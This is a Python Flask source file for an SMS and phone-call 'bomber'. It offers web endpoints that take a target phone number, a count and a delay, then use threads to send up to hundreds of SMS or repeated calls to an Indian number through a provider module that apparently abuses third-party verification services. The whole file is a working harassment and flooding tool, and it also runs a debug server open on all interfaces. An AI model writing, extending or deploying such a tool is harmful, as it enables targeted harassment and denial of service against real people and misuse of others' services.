import os
import shutil
import sys
import subprocess
import string
import random
import json
import re
import time
import argparse
import zipfile
from io import BytesIO

from concurrent.futures import ThreadPoolExecutor, as_completed

from utils.decorators import MessageDecorator
from utils.provider import APIProvider

from flask import Flask
app = Flask(__name__)

def selectnode(mode="sms",target="",count=1,delay=0):
    mesgdcrt = MessageDecorator("stat")
    mode = mode.lower().strip()
    try:
        max_limit = {"sms": 500, "call": 15, "mail": 200}
        
        if mode in ["sms", "call"]:
            cc="91"
            if cc != "91":
                max_limit.update({"sms": 100})
        else:
            raise KeyboardInterrupt

        limit = max_limit[mode]
        while True:
            try:
                if count > limit or count == 0:
                    mesgdcrt.WarningMessage("You have requested " + str(count)
                                            + " {type}".format(
                                                type=mode.upper()))
                    mesgdcrt.GeneralMessage(
                        "Automatically capping the value"
                        " to {limit}".format(limit=limit))
                    count = limit
                # delay = 0
                max_thread_limit = (count//10) if (count//10) > 0 else 1
                max_threads = 8
                max_threads = max_threads if (
                    max_threads > 0) else max_thread_limit
                if (count < 0 or delay < 0):
                    raise Exception
                break
            except KeyboardInterrupt as ki:
                raise ki
            # except Exception:
            #     mesgdcrt.FailureMessage("Read Instructions Carefully !!!")
            #     print()

        workernode(mode, cc, target, count, delay, max_threads)
    except KeyboardInterrupt:
        print("Error: Occured KeyboradInterrupt")

def workernode(mode, cc, target, count, delay, max_threads):

    api = APIProvider(cc, target, mode, delay=delay)
    # clr()
    print("Gearing up the Bomber - Please be patient")
    print(
        "Please stay connected to the internet during bombing")
    print("API Version   : " + api.api_version)
    print("Target        : " + cc + target)
    print("Amount        : " + str(count))
    print("Threads       : " + str(max_threads) + " threads")
    print("Delay         : " + str(delay) +
                            " seconds")
    

    

    success, failed = 0, 0
    while success < count:
        with ThreadPoolExecutor(max_workers=max_threads) as executor:
            jobs = []
            for i in range(count-success):
                jobs.append(executor.submit(api.hit))

            for job in as_completed(jobs):
                result = job.result()
                if result:
                    success += 1
                else:
                    failed += 1
                # clr()
                # pretty_print(cc, target, success, failed)
    print("\n")
    print("Bombing completed!")
    time.sleep(1.5)





@app.route('/smsbomb/<target>/<int:count>/<int:delay>')
def bombsms(target, count, delay):
    selectnode(mode="sms",target=target,count=count,delay=delay)
    return {"success": True, "message": "Bombing Completed", "code": 200, "data": {"target": target, "count": count, "delay": delay}}

@app.route('/callbomb/<target>/<int:count>/<int:delay>')
def bombcall(target, count, delay):
    selectnode(mode="call",target=target,count=count,delay=delay)
    return {"success": True, "message": "Bombing Completed", "code": 200, "data": {"target": target, "count": count, "delay": delay}}


if __name__ == '__main__':
    app.run(debug=True, host='0.0.0.0')